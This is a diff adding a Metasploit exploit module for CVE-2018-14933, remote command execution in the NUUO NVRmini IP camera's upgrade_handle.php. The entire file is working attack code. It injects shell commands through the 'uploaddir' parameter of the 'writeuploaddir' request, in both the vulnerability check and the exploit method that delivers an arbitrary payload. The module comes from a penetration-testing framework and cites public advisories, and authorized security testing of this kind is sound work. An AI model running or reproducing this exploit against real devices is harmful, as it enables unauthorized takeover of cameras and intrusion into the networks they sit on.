@@ -1,0 +1,87 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'        => 'NUUO NVRmini upgrade_handle.php Remote Command Execution',
+      'Description' => %q{
+        This exploits a vulnerability in the web application of NUUO NVRmini IP camera,
+        which can be done by triggering the writeuploaddir command in the upgrade_handle.php file.
+      },
+      'License' => MSF_LICENSE,
+      'Author'  =>
+        [
+          'Berk Dusunur', # @berkdusunur
+          'numan turle'   # @numanturle
+        ],
+      'References' =>
+        [
+          ['URL', 'https://www.berkdusunur.net/2018/11/development-of-metasploit-module-after.html'],
+          ['URL', 'https://www.tenable.com/security/research/tra-2018-41'],
+          ['CVE', '2018-14933'],
+          ['EDB', '45070']
+        ],
+      'Privileged'   => false,
+      'Payload'      =>
+        {
+          'DisableNops' => true
+        },
+      'Platform'       => %w{ unix win linux },
+      'Arch'           => ARCH_CMD,
+      'Targets'        => [ ['NUUO NVRmini', { }], ],
+      'DisclosureDate' => 'Aug 04 2018',
+      'DefaultTarget'  => 0))
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'upgrade_handle.php'),
+      'vars_get' =>
+        {
+          'cmd' => 'writeuploaddir',
+          'uploaddir' => "';echo '#{Rex::Text.rand_text_alphanumeric(10..15)}';'"
+        }}
+      )
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res.code == 200 && res.body =~ /upload_tmp_dir/
+      return CheckCode::Vulnerable
+    end
+
+    CheckCode::Safe
+  end
+
+  def http_send_command(cmd)
+    uri = normalize_uri(target_uri.path.to_s, "upgrade_handle.php")
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      =>  uri,
+      'vars_get' =>
+        {
+          'cmd' => 'writeuploaddir',
+          'uploaddir' => "';"+cmd+";'"
+        }}
+      )
+
+    unless res
+      fail_with(Failure::Unknown, 'Failed to execute the command.')
+    end
+
+    res
+  end
+
+  def exploit
+    http_send_command(payload.encoded)
+  end
+end
